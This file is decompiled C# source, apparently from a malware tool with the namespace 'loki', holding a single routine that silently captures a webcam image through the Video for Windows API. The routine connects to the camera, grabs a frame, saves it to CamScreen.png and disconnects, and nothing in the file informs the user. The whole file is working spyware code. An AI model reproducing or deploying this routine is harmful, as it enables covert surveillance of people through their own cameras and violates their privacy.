using System;
using System.Runtime.InteropServices;

namespace loki.loki.Utilies
{
	// Token: 0x02000025 RID: 37
	internal class GetWebCam
	{
		// Token: 0x0600015F RID: 351 RVA: 0x00008B08 File Offset: 0x00006D08
		public static void Get_webcam()
		{
			IntPtr intptr_ = NativeMethods.capCreateCaptureWindowA("VFW Capture", -1073741824, 0, 0, 640, 480, 0, 0);
			NativeMethods.SendMessage(intptr_, 1034U, 0, 0);
			NativeMethods.SendMessage(intptr_, 1034U, 0, 0);
			NativeMethods.SendMessage(intptr_, 1049U, 0, Marshal.StringToHGlobalAnsi("\\CamScreen.png").ToInt32());
			NativeMethods.SendMessage(intptr_, 1035U, 0, 0);
			NativeMethods.SendMessage(intptr_, 16U, 0, 0);
		}
	}
}
